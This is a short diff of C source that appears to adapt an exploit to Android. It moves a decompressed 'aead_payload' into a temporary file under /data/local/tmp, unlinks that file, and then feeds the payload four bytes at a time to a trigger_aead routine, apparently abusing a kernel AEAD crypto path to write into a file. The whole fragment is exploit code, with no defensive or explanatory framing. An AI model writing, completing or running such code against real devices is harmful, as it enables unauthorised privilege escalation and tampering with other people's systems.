@@ -176,17 +176,17 @@ int main() {
         return 1;
     }
 
-    int mem_fd = memfd_create("aead_payload", MFD_CLOEXEC);
+    char temp_path[] = "/data/local/tmp/aead_payload_XXXXXX";
+    int mem_fd = mkstemp(temp_path);
     if (mem_fd < 0) {
-        mem_fd = open("/tmp/aead_payload.tmp", O_RDWR | O_CREAT | O_TRUNC, 0600);
-        if (mem_fd < 0) {
-            perror("open /tmp/aead_payload.tmp");
-            free(decompressed);
-            return 1;
-        }
+        perror("mkstemp");
+        free(decompressed);
+        return 1;
     }
     write(mem_fd, decompressed, decomp_len);
-    lseek(mem_fd, 0, SEEK_SET); 
+    unlink(temp_path);
+    lseek(mem_fd, 0, SEEK_SET);
+
     for (size_t i = 0; i + 4 <= decomp_len; i += 4) {
         trigger_aead(mem_fd, i, decompressed + i);
     }
